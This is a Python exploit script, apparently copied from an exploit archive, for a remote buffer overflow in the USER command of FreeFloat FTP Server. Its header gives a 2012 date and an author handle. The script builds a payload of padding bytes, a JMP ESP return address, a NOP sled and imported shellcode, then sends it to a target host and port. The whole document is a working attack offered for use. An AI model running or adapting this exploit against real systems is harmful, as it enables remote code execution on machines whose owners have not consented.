#Exploit title: FreeFloat FTP Server Remote Command Execution USER Command Buffer Overflow
#Date: 06/12/2012
#Exploit Author: D35m0nd142
#Vendor Homepage: http://www.freefoat.com
#Tested on Windows XP SP3 with Ubuntu 12.04
#!/usr/bin/python
import socket,sys,time,os
from payload import buf
import socket
import struct
import os
def shell_attack(target_machine, target_port):


	target = target_machine
	junk = b"\x41" * 230     # Offest Number --> 230
	eip = b"\x53\x93\x37\x7E"  # 0x7E379353   FFE4             JMP ESP
	nops = b"\x90" * 20
	
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		sock.connect((target,target_port))
		sock.recv(2000)
		sock.send(b"USER "+junk+eip+nops+buf+b"\r\n")
		sock.close()
	
	except:
		pass


